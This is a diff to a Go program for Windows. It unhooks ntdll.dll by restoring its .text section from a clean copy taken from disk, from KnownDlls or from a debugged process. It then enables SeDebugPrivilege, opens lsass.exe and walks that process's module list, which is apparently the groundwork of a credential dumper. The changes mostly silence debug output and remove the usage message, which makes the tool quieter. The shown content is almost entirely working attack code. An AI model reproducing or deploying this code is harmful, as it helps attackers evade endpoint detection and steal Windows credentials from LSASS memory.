@@ -351,17 +351,17 @@ func query_process_information(proc_handle uintptr) ([]ModuleInformation){
 		return nil
 	}
 	peb_addr := pbi.PebBaseAddress 
-	fmt.Printf("[+] PebBaseAddress:\t0x%s\n", fmt.Sprintf("%x", peb_addr))
+	// fmt.Printf("[+] PebBaseAddress:\t0x%s\n", fmt.Sprintf("%x", peb_addr))
 
 	ldr_pointer := peb_addr + ldr_offset
-	fmt.Printf("[+] Ldr Pointer:\t0x%s\n", fmt.Sprintf("%x", ldr_pointer))
+	// fmt.Printf("[+] Ldr Pointer:\t0x%s\n", fmt.Sprintf("%x", ldr_pointer))
 
 	ldr_addr := read_remoteintptr(proc_handle, ldr_pointer, 8)
-	fmt.Printf("[+] Ldr Address:\t0x%s\n", fmt.Sprintf("%x", ldr_addr))
+	// fmt.Printf("[+] Ldr Address:\t0x%s\n", fmt.Sprintf("%x", ldr_addr))
 
 	inInitializationOrderModuleList := ldr_addr + inInitializationOrderModuleList_offset
 	next_flink := read_remoteintptr(proc_handle, inInitializationOrderModuleList, 8)
-	fmt.Printf("[+] next_flink: \t0x%s\n", fmt.Sprintf("%x", next_flink))
+	// fmt.Printf("[+] next_flink: \t0x%s\n", fmt.Sprintf("%x", next_flink))
 
 	moduleinfo_arr := []ModuleInformation{}
 	
@@ -629,7 +629,7 @@ func get_local_lib_address(dll_name string) uintptr {
     // GetCurrentProcess
     proc_handle, _ := windows.GetCurrentProcess()
     process_handle := uintptr(proc_handle)
-    fmt.Printf("[+] Process Handle: \t%d\n", process_handle)
+    // fmt.Printf("[+] Process Handle: \t%d\n", process_handle)
     var pbi PROCESS_BASIC_INFORMATION
     var returnLength uint32
 
@@ -639,20 +639,20 @@ func get_local_lib_address(dll_name string) uintptr {
         fmt.Printf("NtQueryInformationProcess failed with status: 0x%x\n", status)
         return 0
     }
-    fmt.Printf("[+] Process ID: \t%d\n", pbi.UniqueProcessID)
-    fmt.Printf("[+] PEB Base Address: \t0x%x\n", pbi.PebBaseAddress)
+    fmt.Printf("[+] Process ID: \t\t%d\n", pbi.UniqueProcessID)
+    fmt.Printf("[+] PEB Base Address:\t\t0x%x\n", pbi.PebBaseAddress)
 
     // Ldr Address
     peb_baseaddress := pbi.PebBaseAddress
     ldr_pointer := peb_baseaddress + ldr_offset
     ldr_address := read_remoteintptr(process_handle, ldr_pointer, 8)
-    fmt.Printf("[+] ldr_pointer: \t0x%x\n", ldr_pointer)
-    fmt.Printf("[+] Ldr Address: \t0x%x\n", ldr_address)
+    fmt.Printf("[+] Ldr pointer: \t\t0x%x\n", ldr_pointer)
+    fmt.Printf("[+] Ldr Address: \t\t0x%x\n", ldr_address)
     
     // next_flink
     InInitializationOrderModuleList:= ldr_address + inInitializationOrderModuleList_offset
     next_flink := read_remoteintptr(process_handle, InInitializationOrderModuleList, 8)
-    fmt.Printf("[+] next_flink: \t0x%x\n", next_flink)
+    // fmt.Printf("[+] Next flink: \t0x%x\n", next_flink)
 
     // Loop modules
     var dll_base uintptr = 1337
@@ -674,15 +674,15 @@ func get_local_lib_address(dll_name string) uintptr {
 
 
 func get_section_info(base_address uintptr) (uintptr,uintptr) {
-    proc_handle, _ := windows.GetCurrentProcess()
-    process_handle := uintptr(proc_handle)
-    fmt.Printf("[+] Process Handle: \t%d\n", process_handle)
+    process_handle, _ := windows.GetCurrentProcess()
+    if (fmt.Sprintf("%d", process_handle) == ""){ return 0,0}
+    proc_handle := uintptr(process_handle)
     var e_lfanew_addr uintptr = base_address + 0x3C
-    var e_lfanew uintptr = read_remoteintptr(process_handle, e_lfanew_addr, 4)
+    var e_lfanew uintptr = read_remoteintptr(proc_handle, e_lfanew_addr, 4)
     var sizeofcode_addr uintptr = base_address + e_lfanew + 24 + 4
-    var sizeofcode uintptr = read_remoteintptr(process_handle, sizeofcode_addr, 4)
+    var sizeofcode uintptr = read_remoteintptr(proc_handle, sizeofcode_addr, 4)
     var baseofcode_addr uintptr  = base_address + e_lfanew + 24 + 20
-    var baseofcode uintptr = read_remoteintptr(process_handle, baseofcode_addr, 4)
+    var baseofcode uintptr = read_remoteintptr(proc_handle, baseofcode_addr, 4)
     return baseofcode, sizeofcode
 }
 
@@ -717,7 +717,7 @@ func overwrite_disk(file_name string) uintptr {
         fmt.Printf("Error creating file: %v\n", err)
         return 0
     }
-    fmt.Printf("[+] File handle: \t%d\n", file_handle)
+    // fmt.Printf("[+] File handle: \t%d\n", file_handle)
     defer windows.CloseHandle(windows.Handle(file_handle))
 
     // CreateFileMappingA
@@ -727,7 +727,7 @@ func overwrite_disk(file_name string) uintptr {
         return 0
     }
     defer windows.CloseHandle(windows.Handle(mapping_handle))
-    fmt.Printf("[+] Mapping handle: \t%d\n", mapping_handle)
+    // fmt.Printf("[+] Mapping handle: \t%d\n", mapping_handle)
 
     // MapViewOfFile
     unhooked_ntdll, _, err := mapViewOfFile.Call(mapping_handle, windows.FILE_MAP_READ, 0, 0, 0)
@@ -736,7 +736,7 @@ func overwrite_disk(file_name string) uintptr {
         fmt.Printf("Error mapping view of file: %v\n", err)
         return 0
     }
-    fmt.Printf("[+] Mapped Ntdll:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll))
+    // fmt.Printf("[+] Mapped Ntdll:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll))
 
     // CloseHandle
     windows.CloseHandle(windows.Handle(file_handle))
@@ -768,7 +768,7 @@ func overwrite_knowndlls() uintptr {
         os.Exit(0)
         return 0
     }
-    fmt.Printf("[+] Section handle: \t0x%x\n", section_handle)
+    // fmt.Printf("[+] Section handle: \t0x%x\n", section_handle)
 
     // MapViewOfFile
     unhooked_ntdll, _, err := mapViewOfFile.Call(uintptr(section_handle), uintptr(SECTION_MAP_READ), 0, 0, 0)
@@ -827,12 +827,12 @@ func overwrite_debugproc(file_path string, local_ntdll_txt uintptr, local_ntdll_
 
 func overwrite(optionFlag string, pathFlag string){
 	var local_ntdll uintptr = get_local_lib_address("ntdll.dll")
-    fmt.Printf("[+] Local Ntdll:\t0x%s\n", fmt.Sprintf("%x", local_ntdll))
+    // fmt.Printf("[+] Local Ntdll:\t0x%s\n", fmt.Sprintf("%x", local_ntdll))
     local_ntdll_txt_addr, local_ntdll_txt_size := get_section_info(local_ntdll)
-    fmt.Printf("[+] Local Ntdll Size:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt_size))
-    fmt.Printf("[+] Local Ntdll Addr:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt_addr))
+    // fmt.Printf("[+] Local Ntdll Size:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt_size))
+    // fmt.Printf("[+] Local Ntdll Addr:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt_addr))
     var local_ntdll_txt uintptr = local_ntdll + local_ntdll_txt_addr
-    fmt.Printf("[+] Local Ntdll Text:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt))
+    // fmt.Printf("[+] Local Ntdll Text:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt))
     var unhooked_ntdll_text uintptr = 0
 
     if optionFlag == "disk" {
@@ -840,19 +840,19 @@ func overwrite(optionFlag string, pathFlag string){
         if pathFlag != "default" {
             file_name = pathFlag
         }
-        fmt.Printf("[+] Option \"disk\" - Getting clean version from file in disk %s\n", file_name)
+        // fmt.Printf("[+] Option \"disk\" - Getting clean version from file in disk %s\n", file_name)
         unhooked_ntdll_text = overwrite_disk(file_name)
         if (unhooked_ntdll_text != 0){
-            fmt.Printf("[+] Mapped Ntdll .Text:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll_text))
+            // fmt.Printf("[+] Mapped Ntdll .Text:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll_text))
         } else {
             fmt.Printf("[-] Error getting the .text section address")
             os.Exit(0)
         }
     } else if optionFlag == "knowndlls" {
-        fmt.Println("[+] Option \"knowndlls\" - Getting clean version from KnownDlls folder")
+        // fmt.Println("[+] Option \"knowndlls\" - Getting clean version from KnownDlls folder")
         unhooked_ntdll_text = overwrite_knowndlls()
         if (unhooked_ntdll_text != 0){
-            fmt.Printf("[+] Mapped Ntdll .Text:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll_text))
+            // fmt.Printf("[+] Mapped Ntdll .Text:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll_text))
         } else {
             fmt.Printf("[-] Error getting the .text section address")
             os.Exit(0)       
@@ -862,17 +862,16 @@ func overwrite(optionFlag string, pathFlag string){
         if pathFlag != "default" {
             program_path = pathFlag
         }
-        fmt.Printf("[+] Option \"debugproc\" - Getting clean version from debugged process %s\n", program_path)
+        // fmt.Printf("[+] Option \"debugproc\" - Getting clean version from debugged process %s\n", program_path)
         unhooked_ntdll_text = overwrite_debugproc(program_path, local_ntdll_txt, local_ntdll_txt_size)
         if (unhooked_ntdll_text != 0){
-            fmt.Printf("[+] Mapped Ntdll .Text:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll_text))
+            // fmt.Printf("[+] Mapped Ntdll .Text:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll_text))
         } else {
             fmt.Printf("[-] Error getting the .text section address")
             os.Exit(0)       
         }
     } else {
-        fmt.Println("[-] Parameter -o (Library overwrite option) is mandatory. Possible values: \"disk\", \"knowndlls\" or \"debugproc\" ")
-        os.Exit(0)
+        return
     }
     replace_ntdll_section(unhooked_ntdll_text, local_ntdll_txt, local_ntdll_txt_size)
 }
@@ -908,15 +907,15 @@ func main() {
 	process_name := "lsass.exe"
 	proc_handle := GetProcessByName(process_name)[0]
 	pid := get_pid(proc_handle)
-	fmt.Printf("[+] Process PID:    \t%d\n", pid)
+	fmt.Printf("[+] Process PID:\t\t%d\n", pid)
 	
 	// Get SeDebugPrivilege
 	priv_enabled := enable_SeDebugPrivilege()
-	fmt.Printf("[+] Privilege Enabled:\t%t\n", priv_enabled)
+	fmt.Printf("[+] Privilege Enabled:\t\t%t\n", priv_enabled)
 
 	// Get process handle
 	proc_handle = open_process(pid)
-	fmt.Printf("[+] Process Handle: \t%d\n", proc_handle)
+	fmt.Printf("[+] Process Handle: \t\t%d\n", proc_handle)
 	
 	// Get modules information (except module size)
 	moduleinfo_arr := query_process_information(proc_handle)
